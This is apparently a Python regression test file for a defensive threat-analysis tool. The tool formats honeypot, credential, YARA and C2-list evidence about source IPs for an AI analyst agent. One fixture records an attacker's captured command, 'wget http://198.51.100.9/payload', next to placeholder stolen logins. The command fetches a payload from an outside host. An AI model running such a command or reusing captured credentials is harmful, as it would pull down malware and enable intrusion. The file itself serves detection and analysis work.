# SPDX-License-Identifier: GPL-2.0-or-later
"""Regression tests for passive IP-agent evidence handling."""
import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import analyst


class PassiveIpEvidence(unittest.TestCase):
    def test_evidence_includes_credentials_and_raw_event_details(self):
        data = {
            "count": 3, "blocked": 2, "reached": 1,
            "credentials": [{"text": "root / do-not-send-this-password", "count": 1}],
            "recent": [{"service": "ssh", "detail": "do-not-send-this-command"}],
            "ports": [{"port": 22, "service": "SSH", "count": 3}],
        }
        evidence = analyst.format_ip_evidence("198.51.100.7", data)
        self.assertIn("SSH", evidence)
        self.assertIn("do-not-send-this-password", evidence)
        self.assertIn("do-not-send-this-command", evidence)
        self.assertIn("COMPLETE RAW EVIDENCE", evidence)

    def test_decoy_activity_is_explicit_and_no_yara_match_is_invented(self):
        data = {"count": 0, "blocked": 0, "reached": 0}
        context = {"honeypot": {"total": 2, "logged_in": True, "commands": 4,
                                "samples": [{"sha256": "a" * 64, "name": "payload"}],
                                "evidence_sessions": [{"logins": [{"u": "root", "p": "captured-secret"}],
                                                       "commands": [{"cmd": "wget http://198.51.100.9/payload"}]}],
                                "sample_evidence": [{"sha256": "a" * 64, "yara": {
                                    "matches": [{"rule": "Test_Malware_Family"}]}}]}}
        evidence = analyst.format_ip_evidence("198.51.100.8", data, context)
        self.assertIn("Honeypot decoy activity", evidence)
        self.assertIn("captured-secret", evidence)
        self.assertIn("wget http://198.51.100.9/payload", evidence)
        self.assertIn("Test_Malware_Family", evidence)
        self.assertNotIn("confirmed compromise", evidence.lower())

    def test_evidence_is_not_silently_truncated(self):
        tail = "LAST_RAW_EVENT_MARKER"
        data = {"count": 1, "recent": [{"detail": "x" * 18000 + tail}]}
        evidence = analyst.format_ip_evidence("198.51.100.10", data)
        self.assertIn(tail, evidence)

    def test_c2_match_is_explicitly_gated(self):
        data = {"count": 1, "blocked": 0, "reached": 1}
        no_match = analyst.format_ip_evidence("198.51.100.9", data, known_c2=False)
        match = analyst.format_ip_evidence("198.51.100.9", data, known_c2=True)
        self.assertIn("NO (not in loaded list)", no_match)
        self.assertIn("exact-match: YES", match)
        unknown = analyst.format_ip_evidence("198.51.100.9", data, known_c2=None)
        self.assertIn("UNKNOWN (list not loaded)", unknown)


    def test_sample_prompt_is_defensive_and_evidence_first(self):
        self.assertIn("must never be executed", analyst.SAMPLE_AGENT_SYSTEM_PROMPT)
        self.assertIn("A YARA match is a rule match", analyst.SAMPLE_AGENT_SYSTEM_PROMPT)
        self.assertIn("observed runtime telemetry", analyst.SAMPLE_AGENT_SYSTEM_PROMPT)


if __name__ == "__main__":
    unittest.main()
